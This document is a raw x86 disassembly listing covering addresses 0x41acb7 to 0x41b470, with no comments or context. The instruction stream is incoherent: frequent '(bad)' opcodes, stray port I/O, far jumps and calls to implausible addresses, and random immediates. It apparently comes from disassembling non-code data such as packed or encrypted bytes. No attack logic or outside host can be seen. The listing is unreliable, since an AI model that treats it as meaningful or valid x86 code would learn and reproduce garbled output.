  41acb7:	ret    0xeec9
  41acba:	jp     0x41ac9a
  41acbc:	xor    dh,BYTE PTR [ebp+0x1b]
  41acbf:	mov    ch,bl
  41acc1:	cmp    DWORD PTR [ebx],0x7d
  41acc4:	pop    esp
  41acc5:	das    
  41acc6:	pop    eax
  41acc7:	inc    edi
  41acc8:	mov    ebx,0x949493db
  41accd:	mov    ebp,0xb11d5f1b
  41acd2:	add    BYTE PTR [esi],bh
  41acd4:	pushf  
  41acd5:	ficomp DWORD PTR [ecx]
  41acd7:	ja     0x41ad4d
  41acd9:	daa    
  41acda:	pusha  
  41acdb:	push   0x36486aff
  41ace0:	fisubr DWORD PTR [esi+ebp*1-0x3f]
  41ace4:	test   eax,0xd4bc817a
  41ace9:	and    BYTE PTR [ebx+0x20bff916],0x57
  41acf0:	mov    cs,WORD PTR [edi]
  41acf2:	pop    esp
  41acf3:	into   
  41acf4:	stos   BYTE PTR es:[edi],al
  41acf5:	mov    eax,ds:0x979c0277
  41acfa:	and    al,0xfd
  41acfc:	int    0x79
  41acfe:	or     BYTE PTR [ecx],al
  41ad00:	sti    
  41ad01:	leave  
  41ad02:	ds test eax,esi
  41ad05:	push   ebp
  41ad06:	cld    
  41ad07:	imul   edi,ebp,0xb
  41ad0a:	imul   ebp,DWORD PTR [edx-0x77663388],0x15210efe
  41ad14:	pop    edi
  41ad15:	(bad)  
  41ad16:	loopne 0x41acaf
  41ad18:	jp     0x41ad3b
  41ad1a:	out    0x5d,al
  41ad1c:	mov    edx,0xe459359a
  41ad21:	popa   
  41ad22:	jns    0x41acce
  41ad24:	pusha  
  41ad25:	adc    BYTE PTR [esi],dl
  41ad27:	and    BYTE PTR [ecx+0x7],0x30
  41ad2b:	cmp    ebx,eax
  41ad2d:	mov    ch,0x22
  41ad2f:	stos   BYTE PTR es:[edi],al
  41ad30:	inc    ebp
  41ad31:	out    0xab,eax
  41ad33:	sub    DWORD PTR [edx-0x6a],edi
  41ad36:	push   eax
  41ad37:	dec    edi
  41ad38:	adc    al,cl
  41ad3a:	adc    DWORD PTR [esi-0x7a027ff6],ebp
  41ad40:	xchg   edi,eax
  41ad41:	daa    
  41ad42:	or     eax,0x1b8f32ad
  41ad47:	dec    esi
  41ad48:	fadd   DWORD PTR [ecx+0x74]
  41ad4b:	mov    WORD PTR [edx+0x42],es
  41ad4e:	test   BYTE PTR [edi+0x28],cl
  41ad51:	add    DWORD PTR [esp+ebx*8],ebp
  41ad54:	push   esp
  41ad55:	xchg   ebx,eax
  41ad56:	outs   dx,BYTE PTR ds:[esi]
  41ad57:	and    eax,0xf5e44deb
  41ad5c:	mov    al,0x75
  41ad5e:	xchg   edx,eax
  41ad5f:	(bad)  
  41ad61:	inc    eax
  41ad62:	in     al,dx
  41ad63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad64:	or     DWORD PTR [edx-0xc],0x572a47bf
  41ad6b:	test   al,0x5b
  41ad6d:	dec    esi
  41ad6e:	cmp    edi,DWORD PTR [edx+0x71]
  41ad71:	push   edx
  41ad72:	mov    bh,0xbc
  41ad74:	dec    esi
  41ad75:	jmp    0xc39a90f9
  41ad7a:	pusha  
  41ad7b:	out    0xa2,al
  41ad7d:	pop    edx
  41ad7e:	jge    0x41ad86
  41ad80:	push   ecx
  41ad81:	push   es
  41ad82:	ds xchg edi,eax
  41ad84:	add    al,0x3c
  41ad86:	cmp    dl,bl
  41ad88:	enter  0x735e,0x33
  41ad8c:	shl    BYTE PTR [esi+0xa],cl
  41ad8f:	push   esi
  41ad90:	xchg   BYTE PTR [ebp-0x13a0778e],bh
  41ad96:	adc    ch,dh
  41ad98:	mov    al,ds:0x731687ac
  41ad9d:	mov    edi,0x13f8ecc7
  41ada2:	fstp   QWORD PTR [eax+0x1b68552f]
  41ada8:	jmp    0x41adce
  41adaa:	inc    ebx
  41adab:	shr    al,0xf
  41adae:	aad    0x5e
  41adb0:	addr16 sub al,0xec
  41adb3:	adc    DWORD PTR [edx+0xcfe6df3],esi
  41adb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adba:	add    eax,0xacd5064f
  41adbf:	lds    esp,FWORD PTR [eax+0x39]
  41adc2:	mov    dh,0xf6
  41adc4:	adc    dh,BYTE PTR [ebx]
  41adc6:	jge    0x41ae33
  41adc8:	pop    edi
  41adc9:	sub    al,0x35
  41adcb:	popa   
  41adcc:	pop    esi
  41adcd:	addr16 mov edi,0x5b13308a
  41add3:	mov    edx,0x103fc626
  41add8:	jecxz  0x41adcd
  41adda:	fucomip st,st(2)
  41addc:	or     BYTE PTR [edi+0x2ddd2a40],dl
  41ade2:	loope  0x41ae5c
  41ade4:	xchg   edx,eax
  41ade5:	push   0xea941452
  41adea:	(bad)  
  41adec:	push   eax
  41aded:	(bad)  
  41adee:	cmp    DWORD PTR [ecx+0x46],edx
  41adf1:	pop    ebx
  41adf2:	fidiv  WORD PTR [edx]
  41adf4:	or     al,0x9a
  41adf6:	fcmovb st,st(0)
  41adf8:	mov    dl,0x8b
  41adfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adfb:	and    al,0x51
  41adfd:	cli    
  41adfe:	call   0x14e682e
  41ae03:	sbb    ebx,DWORD PTR [esi+eax*1-0x74c92196]
  41ae0a:	into   
  41ae0b:	push   es
  41ae0c:	ins    BYTE PTR es:[edi],dx
  41ae0d:	mov    dh,BYTE PTR [ebx]
  41ae0f:	fidivr WORD PTR [ecx+0x34976772]
  41ae15:	(bad)  
  41ae16:	mov    ebx,0xb1f15906
  41ae1b:	stc    
  41ae1c:	loop   0x41add9
  41ae1e:	(bad)  
  41ae20:	xchg   ebx,eax
  41ae21:	stc    
  41ae22:	imul   esp,DWORD PTR [ebx+0x63],0xe2164a20
  41ae29:	out    dx,eax
  41ae2a:	das    
  41ae2b:	retf   0x18a2
  41ae2e:	(bad)  
  41ae2f:	(bad)  [ecx-0x72b06d2f]
  41ae35:	imul   DWORD PTR gs:[ecx-0x46be9e4f]
  41ae3c:	push   cs
  41ae3d:	scas   eax,DWORD PTR es:[edi]
  41ae3e:	push   esp
  41ae3f:	adc    ebp,edi
  41ae41:	push   0x32b5f436
  41ae46:	or     eax,0x460771d4
  41ae4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae4c:	rcl    dh,1
  41ae4e:	int3   
  41ae4f:	retf   
  41ae50:	repz (bad) 
  41ae52:	mov    dh,0xf
  41ae54:	pop    ebx
  41ae55:	xchg   DWORD PTR gs:[ebp*4+0x39d23887],esp
  41ae5d:	call   0x5f5f:0xad494f43
  41ae64:	push   0x9425efdd
  41ae69:	pushf  
  41ae6a:	sbb    BYTE PTR [ebx],bl
  41ae6c:	ret    
  41ae6d:	popf   
  41ae6e:	xlat   BYTE PTR ds:[ebx]
  41ae6f:	xor    DWORD PTR ds:0xee10ee80,eax
  41ae75:	push   edx
  41ae76:	lods   eax,DWORD PTR ds:[esi]
  41ae77:	sti    
  41ae78:	and    eax,0xf8157a63
  41ae7d:	push   ebp
  41ae7e:	aad    0xfb
  41ae80:	mov    esi,0xfa13f8c6
  41ae85:	and    BYTE PTR [ecx+0x4beb792a],bh
  41ae8b:	push   ds
  41ae8c:	mov    dl,0x6
  41ae8e:	out    0xcb,al
  41ae90:	xor    bl,BYTE PTR [esi+0x3ba45bd5]
  41ae96:	adc    DWORD PTR [edx+eax*8-0x70],ebp
  41ae9a:	xchg   ebx,eax
  41ae9b:	stc    
  41ae9c:	arpl   bp,bx
  41ae9e:	pop    edi
  41ae9f:	shr    ebp,cl
  41aea1:	cli    
  41aea2:	inc    esp
  41aea3:	inc    edi
  41aea4:	or     eax,0xf5798f84
  41aea9:	xchg   edx,eax
  41aeaa:	or     eax,0xd1059649
  41aeaf:	sbb    BYTE PTR ds:0x726f1c43,al
  41aeb5:	fdivr  st,st(7)
  41aeb7:	dec    esi
  41aeb8:	inc    esp
  41aeb9:	rcl    DWORD PTR [eax+eax*1+0x7fc7a6dc],0x74
  41aec1:	mov    ds,WORD PTR [ebp+0x48ca9d14]
  41aec7:	xchg   esp,eax
  41aec8:	jbe    0x41af2c
  41aeca:	xor    ebx,DWORD PTR [eax+0x40ecb652]
  41aed0:	leave  
  41aed1:	mov    cl,0x2f
  41aed3:	cli    
  41aed4:	lock mov bh,0x67
  41aed7:	adc    BYTE PTR [eax],bl
  41aed9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aeda:	pop    ebx
  41aedb:	dec    edi
  41aedc:	(bad)  ds:0x7a2e3012
  41aee2:	push   cs
  41aee3:	out    0xf9,al
  41aee5:	fsubr  QWORD PTR [eax+ecx*4]
  41aee8:	imul   esp,DWORD PTR [eax],0xffffffcb
  41aeeb:	sahf   
  41aeec:	xor    DWORD PTR [edx],edx
  41aeee:	mov    bl,al
  41aef0:	dec    BYTE PTR [esi]
  41aef2:	out    dx,eax
  41aef3:	sbb    eax,0x65bf3465
  41aef8:	sbb    ecx,DWORD PTR [eax+0x40]
  41aefb:	mov    edx,0x6c7d0908
  41af00:	jnp    0x41aef0
  41af02:	xchg   BYTE PTR [edx],dh
  41af04:	enter  0xcd12,0x79
  41af08:	xor    DWORD PTR [esi],esi
  41af0a:	ins    DWORD PTR es:[edi],dx
  41af0b:	lahf   
  41af0c:	in     al,dx
  41af0d:	push   0x4e
  41af0f:	pop    ss
  41af10:	dec    esi
  41af11:	push   0x8503e2de
  41af16:	daa    
  41af17:	adc    eax,0xdd8481e1
  41af1c:	hlt    
  41af1d:	or     DWORD PTR [eax+0x395a3a1f],esi
  41af23:	or     cl,bh
  41af25:	jecxz  0x41af0e
  41af27:	push   es
  41af28:	push   eax
  41af29:	sub    edx,ebp
  41af2b:	in     al,0x9d
  41af2d:	jg     0x41af0d
  41af2f:	ret    0xb231
  41af32:	out    dx,eax
  41af33:	(bad)  
  41af34:	and    al,0x12
  41af36:	mov    ds:0x26328c22,eax
  41af3b:	push   es
  41af3c:	or     al,0x1
  41af3e:	xchg   esp,eax
  41af3f:	inc    ebx
  41af40:	mov    ?,WORD PTR [eax-0x6120360b]
  41af46:	ret    
  41af47:	mov    ds:0x57ec4de7,al
  41af4c:	fs or  dh,dh
  41af4f:	(bad)  
  41af50:	mov    esi,0x30889dee
  41af55:	or     eax,0x3d430569
  41af5a:	mov    DWORD PTR [ebp+0x16],eax
  41af5d:	jne    0x41aee4
  41af5f:	imul   edi,esp,0xfffffffe
  41af62:	pxor   mm7,QWORD PTR [ebx]
  41af65:	add    BYTE PTR [edi],bh
  41af67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af68:	jp     0x41afa4
  41af6a:	enter  0x7f02,0xef
  41af6e:	lock call 0xe0c49db
  41af74:	pop    es
  41af75:	mov    edi,0x70a42b41
  41af7a:	adc    BYTE PTR [eax],cl
  41af7c:	xchg   DWORD PTR ds:[edi-0x6e69f91a],ebp
  41af83:	push   ebx
  41af84:	and    edi,DWORD PTR [esi-0x65664e4e]
  41af8a:	and    eax,0xb3729ebc
  41af8f:	fs int 0x32
  41af92:	(bad)  
  41af93:	pop    esi
  41af94:	mov    dh,0xfa
  41af96:	jnp    0x41b00c
  41af98:	scas   eax,DWORD PTR es:[edi]
  41af99:	sbb    bh,al
  41af9b:	arpl   WORD PTR [edi],ax
  41af9d:	sar    BYTE PTR [ecx+edx*8+0x18],0xcc
  41afa2:	xor    ah,BYTE PTR [eax]
  41afa4:	mov    dl,al
  41afa6:	cmp    ebx,0x62
  41afa9:	sub    al,0xd3
  41afab:	dec    ebx
  41afac:	xchg   ebp,eax
  41afad:	fwait
  41afae:	and    BYTE PTR [edi+0x47],0x2e
  41afb2:	push   ss
  41afb3:	jne    0x41af5c
  41afb5:	js     0x41afb9
  41afb7:	or     eax,0x415cdb67
  41afbc:	sti    
  41afbd:	xchg   edx,eax
  41afbe:	or     DWORD PTR [ebp+0x19b0f9c9],edi
  41afc4:	cwde   
  41afc5:	dec    ebp
  41afc6:	jecxz  0x41afc8
  41afc8:	mov    ah,0x6b
  41afca:	add    al,0xb6
  41afcc:	dec    ebx
  41afcd:	adc    cl,al
  41afcf:	sub    BYTE PTR [edi],dl
  41afd1:	fwait
  41afd2:	and    al,0x79
  41afd4:	push   0xffffff9a
  41afd6:	cmp    BYTE PTR [esi],dl
  41afd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afd9:	xor    edx,ebp
  41afdb:	jmp    0xa6ed:0x539b5189
  41afe2:	fcmovnu st,st(5)
  41afe4:	shl    ah,1
  41afe6:	jmp    0x9a40:0x1af7e22d
  41afed:	push   0x6c751d8a
  41aff2:	mov    ds:0x58a2ee78,al
  41aff7:	push   ss
  41aff8:	mov    ebx,0x4d5260c
  41affd:	sbb    DWORD PTR [ebx-0x19aee250],0x2d646b4b
  41b007:	pop    ebp
  41b008:	aas    
  41b009:	cmp    BYTE PTR [ecx+esi*2+0x5b],0x4a
  41b00e:	mov    ds:0x7d78912,al
  41b013:	test   DWORD PTR [esi+0x290ae1ca],esi
  41b019:	mov    ebp,0xc503562c
  41b01e:	out    0x9a,al
  41b020:	stos   DWORD PTR es:[edi],eax
  41b021:	arpl   WORD PTR [ebp+0x20],dx
  41b024:	lock xchg esp,eax
  41b026:	mov    ecx,0xcda0d05d
  41b02b:	cld    
  41b02c:	xor    al,0xe2
  41b02e:	ret    0x3d64
  41b031:	ja     0x41b07c
  41b033:	sbb    BYTE PTR [edi-0x19],cl
  41b036:	call   0xdc0a4bfa
  41b03b:	mov    eax,0xee290e56
  41b040:	pop    ds
  41b041:	xchg   ebp,ebp
  41b043:	jnp    0x41aff3
  41b045:	mov    esp,0x2929cbd2
  41b04a:	sti    
  41b04b:	pop    edx
  41b04c:	jp     0x41b07f
  41b04e:	jge    0x41affc
  41b050:	cmp    bl,BYTE PTR [edx]
  41b052:	sbb    DWORD PTR [edi+0x4b6aae83],ebp
  41b058:	aam    0x68
  41b05a:	je     0x41b049
  41b05c:	in     al,0xbb
  41b05e:	or     edx,DWORD PTR [esi+0x5c]
  41b061:	sbb    DWORD PTR [ebp+0x7b],ebp
  41b064:	fisttp QWORD PTR [esi+0x1f]
  41b067:	rcl    BYTE PTR [eax-0x649f51b3],1
  41b06d:	or     dl,BYTE PTR [eax]
  41b06f:	sbb    ch,BYTE PTR [edx]
  41b071:	jmp    0x9c70:0xdbeeecdb
  41b078:	add    BYTE PTR [esi+0x75],ah
  41b07b:	inc    ecx
  41b07c:	sbb    bl,BYTE PTR [edi]
  41b07e:	mov    eax,ds:0x14c77e75
  41b083:	sbb    esi,ecx
  41b085:	cmc    
  41b086:	fstp   QWORD PTR [edi]
  41b088:	xchg   esp,eax
  41b089:	sbb    DWORD PTR [ebx-0x50414d8],eax
  41b08f:	sbb    cl,dl
  41b091:	clc    
  41b092:	sub    al,0x18
  41b094:	ins    BYTE PTR es:[edi],dx
  41b095:	std    
  41b096:	xchg   edx,eax
  41b097:	dec    ebp
  41b098:	xlat   BYTE PTR ds:[bx]
  41b09a:	xchg   DWORD PTR [esi],ecx
  41b09c:	sub    al,0xb9
  41b09e:	js     0x41b04f
  41b0a0:	in     al,0x27
  41b0a2:	aas    
  41b0a3:	mov    eax,0x5518e678
  41b0a8:	fld    st(4)
  41b0aa:	jae    0x41b042
  41b0ac:	pop    es
  41b0ad:	stos   DWORD PTR es:[edi],eax
  41b0ae:	push   ecx
  41b0af:	mov    dl,0xe
  41b0b1:	das    
  41b0b2:	dec    edx
  41b0b3:	(bad)  
  41b0b4:	in     eax,dx
  41b0b5:	and    DWORD PTR [ebx],0x3461f99c
  41b0bb:	push   0xb65faff9
  41b0c0:	lods   eax,DWORD PTR ds:[esi]
  41b0c1:	hlt    
  41b0c2:	retf   
  41b0c3:	call   0x8a880fba
  41b0c8:	pop    ds
  41b0c9:	shr    DWORD PTR [ebp-0x32],0x1d
  41b0cd:	(bad)  
  41b0ce:	xchg   edx,eax
  41b0cf:	or     al,dl
  41b0d1:	ficomp WORD PTR [ebx]
  41b0d3:	retf   
  41b0d4:	mov    ?,WORD PTR [esp+ecx*4+0x63]
  41b0d8:	jecxz  0x41b065
  41b0da:	out    0xb4,eax
  41b0dc:	mov    ebx,0x599e3b4b
  41b0e1:	int    0xe2
  41b0e3:	into   
  41b0e4:	pushf  
  41b0e5:	dec    edi
  41b0e6:	fcmovu st,st(0)
  41b0e8:	xor    bl,0xd8
  41b0eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0ec:	call   0x9a7e:0xb8401dc2
  41b0f3:	imul   esi,ebx,0x48f81d32
  41b0f9:	je     0x41b13a
  41b0fb:	aas    
  41b0fc:	sub    ch,BYTE PTR [esp+edx*2+0x22c58cf0]
  41b103:	push   cs
  41b104:	mov    esi,0x4da36bad
  41b109:	daa    
  41b10a:	dec    eax
  41b10b:	out    dx,al
  41b10c:	add    dl,bl
  41b10e:	in     eax,dx
  41b10f:	mov    ch,0x87
  41b111:	adc    al,0x37
  41b113:	jbe    0x41b163
  41b115:	jae    0x41b114
  41b117:	sbb    DWORD PTR [esi+0x2edfaa13],ecx
  41b11d:	and    ebp,DWORD PTR [esi-0x8aa6971]
  41b123:	push   ebx
  41b124:	dec    edx
  41b125:	js     0x41b0d4
  41b127:	xor    al,0x61
  41b129:	(bad)  
  41b12b:	sar    eax,1
  41b12d:	idiv   esi
  41b12f:	mov    ch,0x13
  41b131:	les    esp,FWORD PTR [edi]
  41b133:	dec    ebp
  41b134:	pop    edi
  41b135:	mov    al,0xd8
  41b137:	lods   al,BYTE PTR ds:[esi]
  41b138:	push   ebp
  41b139:	hlt    
  41b13a:	pop    ebx
  41b13b:	mov    ch,0xee
  41b13d:	iret   
  41b13e:	cmp    DWORD PTR [edi+0x1],0x60bce05f
  41b145:	mov    al,ds:0xabe5537d
  41b14a:	call   0x3eb2e8b6
  41b14f:	or     eax,0x61
  41b152:	pusha  
  41b153:	aad    0xa
  41b155:	jo     0x41b157
  41b157:	popf   
  41b158:	test   DWORD PTR [ebx-0x550939ca],eax
  41b15e:	(bad)  
  41b160:	sub    eax,DWORD PTR [eax+0x4d4c26c6]
  41b166:	adc    edx,DWORD PTR [edi+ebp*4+0x4a]
  41b16a:	ret    
  41b16b:	sbb    al,0x34
  41b16d:	push   ebx
  41b16e:	aaa    
  41b16f:	and    ebx,DWORD PTR [ebp-0x2d]
  41b172:	and    DWORD PTR [esi],0x21679f73
  41b178:	pop    eax
  41b179:	add    DWORD PTR [eax],ebp
  41b17b:	not    DWORD PTR ds:[ebx]
  41b17e:	sbb    DWORD PTR [eax-0x28f90a7b],0x2b50f299
  41b188:	add    BYTE PTR [eax+0x3b31d10a],cl
  41b18e:	sub    dl,BYTE PTR [edx]
  41b190:	mov    ecx,DWORD PTR [edx+ebp*8-0x6f3f1ebf]
  41b197:	cli    
  41b198:	push   esp
  41b199:	loopne 0x41b149
  41b19b:	sub    esi,DWORD PTR [eax+0x78edd78]
  41b1a1:	adc    eax,DWORD PTR [ecx+esi*8-0x7e]
  41b1a5:	popa   
  41b1a6:	mov    edi,0x6c4d8a1f
  41b1ab:	je     0x41b21f
  41b1ad:	jp     0x41b164
  41b1af:	dec    ebp
  41b1b0:	call   0xe6bc:0x810ab430
  41b1b7:	cmp    al,BYTE PTR [ebx+0x66]
  41b1ba:	call   0xf697e151
  41b1bf:	xor    al,0x7a
  41b1c1:	fisttp QWORD PTR [ebp-0xe]
  41b1c4:	stc    
  41b1c5:	in     al,dx
  41b1c6:	dec    esi
  41b1c7:	fnsave [edx-0x3a]
  41b1ca:	mov    eax,ds:0x7436b8ec
  41b1cf:	test   eax,0x8792cd1a
  41b1d4:	push   ds
  41b1d5:	pop    ds
  41b1d6:	xchg   esi,eax
  41b1d7:	hlt    
  41b1d8:	aad    0x1f
  41b1da:	mov    ecx,DWORD PTR [ebx-0x26]
  41b1dd:	loopne 0x41b25d
  41b1df:	fnstcw WORD PTR [ecx-0x57]
  41b1e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1e3:	data16 stc 
  41b1e5:	in     eax,0x37
  41b1e7:	outs   dx,DWORD PTR ds:[esi]
  41b1e8:	ss mov ebp,0x76112f68
  41b1ee:	mov    eax,ds:0xae85dd
  41b1f3:	dec    ecx
  41b1f4:	mov    al,0xd1
  41b1f6:	or     al,0x35
  41b1f8:	inc    esi
  41b1f9:	gs or  al,0xd9
  41b1fc:	sar    DWORD PTR [ecx-0x64],0x91
  41b200:	sub    BYTE PTR [esi-0x3a],ah
  41b203:	test   DWORD PTR ds:0x4a6e3ef6,eax
  41b209:	and    DWORD PTR [ebp-0x5fb628e2],edx
  41b20f:	adc    DWORD PTR [ecx],edx
  41b211:	cmp    ah,BYTE PTR [eax+0x2c]
  41b214:	mov    DWORD PTR [ecx],esp
  41b216:	pop    es
  41b217:	or     BYTE PTR [esi-0x4bec72a8],cl
  41b21d:	inc    esi
  41b21e:	sub    ebp,esi
  41b220:	out    dx,al
  41b221:	sub    BYTE PTR [eax],dh
  41b223:	jb     0x41b1ad
  41b225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b226:	int3   
  41b227:	and    BYTE PTR [edx+edx*1+0x4eab8d16],0x75
  41b22f:	jnp    0x41b21b
  41b231:	or     dl,ch
  41b233:	xor    al,0x5b
  41b235:	in     eax,dx
  41b236:	pop    edx
  41b237:	xchg   esp,eax
  41b238:	mov    ss,WORD PTR [ebx-0x62abd759]
  41b23e:	xlat   BYTE PTR ds:[ebx]
  41b23f:	push   esp
  41b240:	iret   
  41b241:	adc    edi,DWORD PTR [edi+0x4fcee86a]
  41b247:	adc    ah,BYTE PTR [edx-0x4d]
  41b24a:	ret    
  41b24b:	pop    ss
  41b24c:	(bad)  
  41b24d:	pop    ecx
  41b24e:	push   ds
  41b24f:	sti    
  41b250:	test   DWORD PTR [eax+0x74],esp
  41b253:	test   eax,0x18f1a600
  41b258:	lds    esi,FWORD PTR [ecx+eax*8-0x43]
  41b25c:	cmp    BYTE PTR [edi+0x33497f06],cl
  41b262:	ffreep st(3)
  41b264:	xor    eax,0xf43a03a5
  41b269:	ret    
  41b26a:	xor    al,0xd2
  41b26c:	jae    0x41b2ba
  41b26e:	loop   0x41b254
  41b270:	inc    esi
  41b271:	rol    ecx,cl
  41b273:	and    al,0xec
  41b275:	aaa    
  41b276:	jg     0x41b2ef
  41b278:	sub    cl,BYTE PTR [edi]
  41b27a:	adc    ebp,DWORD PTR [edi-0x10]
  41b27d:	mov    edx,0xae49856c
  41b282:	push   0x2a6d2888
  41b287:	inc    ebp
  41b288:	repnz and DWORD PTR ds:0xd3b773fc,ecx
  41b28f:	stc    
  41b290:	out    dx,al
  41b291:	popf   
  41b292:	stc    
  41b293:	xor    BYTE PTR [eax-0x1b],dl
  41b296:	jl     0x41b241
  41b298:	pop    es
  41b299:	mov    ah,0x5c
  41b29b:	je     0x41b2a8
  41b29d:	dec    esi
  41b29e:	inc    edi
  41b29f:	imul   ebx,DWORD PTR [ebx+0x7bd8aa1d],0x42731a8b
  41b2a9:	shl    bl,cl
  41b2ab:	mov    ds:0xc6b92eaf,al
  41b2b0:	xlat   BYTE PTR ds:[ebx]
  41b2b1:	inc    ebp
  41b2b2:	dec    edi
  41b2b3:	fisubr DWORD PTR [edi]
  41b2b5:	dec    edx
  41b2b6:	and    DWORD PTR [esi-0x7c32d292],ebx
  41b2bc:	mov    ebp,0x12eae20b
  41b2c1:	mov    esi,0xb2dd8762
  41b2c6:	mov    bh,0xbd
  41b2c8:	ret    
  41b2c9:	pop    edi
  41b2ca:	jle    0x41b298
  41b2cc:	ins    BYTE PTR es:[edi],dx
  41b2cd:	hlt    
  41b2ce:	and    BYTE PTR [edx+0x6d],ah
  41b2d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2d2:	imul   edx,ebp,0xa
  41b2d5:	mov    ebx,0x70e6aab5
  41b2da:	xchg   esp,eax
  41b2db:	sti    
  41b2dc:	idiv   BYTE PTR [ebp-0x2a44fd8d]
  41b2e2:	adc    ax,bp
  41b2e5:	ja     0x41b359
  41b2e7:	dec    eax
  41b2e8:	sbb    DWORD PTR [edi+0x5ed8701],esi
  41b2ee:	xchg   edx,eax
  41b2ef:	jmp    0x41b2ce
  41b2f1:	push   ss
  41b2f2:	dec    edi
  41b2f3:	pushf  
  41b2f4:	sahf   
  41b2f5:	adc    al,0xf3
  41b2f7:	bound  edx,QWORD PTR ds:0x3b4e703
  41b2fd:	sub    BYTE PTR [ecx+0x61],0x29
  41b301:	mov    dh,dh
  41b303:	push   esi
  41b304:	jmp    0x41b2b5
  41b306:	shl    DWORD PTR [esi+0x15],0x5a
  41b30a:	inc    esi
  41b30b:	inc    ebx
  41b30c:	pop    eax
  41b30d:	shr    BYTE PTR [edi],0xc7
  41b310:	fisttp QWORD PTR [esi-0x37]
  41b313:	(bad)  
  41b314:	pop    edi
  41b315:	lahf   
  41b316:	xor    al,0x16
  41b318:	add    eax,0x606a4123
  41b31d:	xor    BYTE PTR [eax-0x1fa91774],dl
  41b323:	fwait
  41b324:	jns    0x41b2aa
  41b326:	ss into 
  41b328:	push   DWORD PTR [edx-0x631700ec]
  41b32e:	bound  ebp,QWORD PTR [ebp-0xd46a832]
  41b334:	call   FWORD PTR [edi+0x1a53e71f]
  41b33a:	in     al,0x32
  41b33c:	ret    
  41b33d:	dec    edi
  41b33e:	jmp    0x56ca:0x9146c34a
  41b345:	sub    esi,DWORD PTR [edx]
  41b347:	(bad)  
  41b348:	fs jecxz 0x41b2d3
  41b34b:	cmp    esp,DWORD PTR [eax+0x19]
  41b34e:	(bad)  
  41b34f:	mov    eax,0xc4347c56
  41b354:	aaa    
  41b355:	mov    ah,BYTE PTR [ebp-0x1402fdcd]
  41b35b:	nop
  41b35c:	dec    edi
  41b35d:	fidiv  DWORD PTR [eax-0x53d84098]
  41b363:	shl    bl,0xd9
  41b366:	xchg   esi,eax
  41b367:	push   ss
  41b368:	call   0xccdc:0x3441774
  41b36f:	push   esp
  41b370:	daa    
  41b371:	mov    DWORD PTR [ebp+0x7a],edi
  41b374:	pusha  
  41b375:	add    ch,BYTE PTR [edi+0x471ca519]
  41b37b:	xor    eax,0x986a2088
  41b380:	cmp    DWORD PTR [eax+0x3d5858a6],edx
  41b386:	mov    WORD PTR [ebx-0x50],es
  41b389:	xchg   edx,eax
  41b38a:	fidivr WORD PTR [ebx-0x28e5ce53]
  41b390:	xchg   DWORD PTR [eax],ecx
  41b392:	bound  eax,QWORD PTR [edi-0x15]
  41b395:	es xchg edi,eax
  41b397:	pop    ss
  41b398:	jns    0x41b371
  41b39a:	add    eax,0x89d3a633
  41b39f:	fisubr DWORD PTR ss:[esi+edi*1-0x7c809ce8]
  41b3a7:	pop    ecx
  41b3a8:	lea    ecx,[ecx+0x375ee9bc]
  41b3ae:	sbb    al,BYTE PTR [edi-0xe2f8b00]
  41b3b4:	mov    bl,0x5a
  41b3b6:	test   bh,bh
  41b3b8:	shl    DWORD PTR [esi-0x15],1
  41b3bb:	stos   DWORD PTR es:[edi],eax
  41b3bc:	int3   
  41b3bd:	mov    edi,eax
  41b3bf:	aaa    
  41b3c0:	sub    DWORD PTR ds:0xae210103,esi
  41b3c6:	imul   BYTE PTR [ebp-0x7fc6a9a8]
  41b3cc:	in     al,0x78
  41b3ce:	addr16 sub eax,0x58e99d2e
  41b3d4:	pop    ebx
  41b3d5:	fwait
  41b3d6:	push   ds
  41b3d7:	mov    ebp,edi
  41b3d9:	out    dx,al
  41b3da:	out    0xaa,eax
  41b3dc:	int    0x89
  41b3de:	cs jae 0x41b3a4
  41b3e1:	scas   eax,DWORD PTR es:[edi]
  41b3e2:	ins    BYTE PTR es:[edi],dx
  41b3e3:	sbb    BYTE PTR [ebx-0x14],al
  41b3e6:	mov    esp,0x38adcbb4
  41b3eb:	data16 sbb dh,BYTE PTR [eax-0x53605062]
  41b3f2:	dec    edx
  41b3f3:	xor    al,0xfe
  41b3f5:	lods   al,BYTE PTR cs:[esi]
  41b3f7:	in     eax,0xbd
  41b3f9:	mov    eax,ds:0xb3539b17
  41b3fe:	mov    ds:0xea0a6e9,al
  41b403:	jnp    0x41b3a8
  41b405:	retf   0x18a9
  41b408:	addr16 push ecx
  41b40a:	dec    esp
  41b40b:	js     0x41b3d7
  41b40d:	adc    ah,dh
  41b40f:	xchg   edi,ebx
  41b411:	jl     0x41b40b
  41b413:	push   esp
  41b414:	ds pop edi
  41b416:	pusha  
  41b417:	mov    dl,0x5f
  41b419:	xor    eax,0xdce0f08e
  41b41e:	mov    dh,BYTE PTR fs:[ebx]
  41b421:	jbe    0x41b497
  41b423:	push   es
  41b424:	cmp    bh,BYTE PTR [ecx]
  41b426:	cmp    esi,ecx
  41b428:	adc    ah,BYTE PTR [esi-0x7]
  41b42b:	mov    WORD PTR [edi-0x2922a87f],es
  41b431:	das    
  41b432:	aaa    
  41b433:	imul   ecx,DWORD PTR [ecx+0x3aa18bb1],0xf473b995
  41b43d:	lds    ebp,FWORD PTR [esi+0x7a]
  41b440:	ja     0x41b498
  41b442:	imul   esp,DWORD PTR [ebx],0xf5423659
  41b448:	mul    DWORD PTR ds:0xc3c85b2a
  41b44e:	iret   
  41b44f:	mov    gs,eax
  41b451:	xchg   BYTE PTR ds:0xaf458058,bh
  41b457:	or     BYTE PTR [edi+0x4],0x68
  41b45b:	push   ebp
  41b45c:	and    al,0x2f
  41b45e:	aad    0xb0
  41b460:	sub    bl,0x7e
  41b463:	inc    ebx
  41b464:	mov    ch,0xc8
  41b466:	fimul  WORD PTR [edx]
  41b468:	call   0xed974f53
  41b46d:	dec    ecx
  41b46e:	je     0x41b4a8
  41b470:	inc    esi
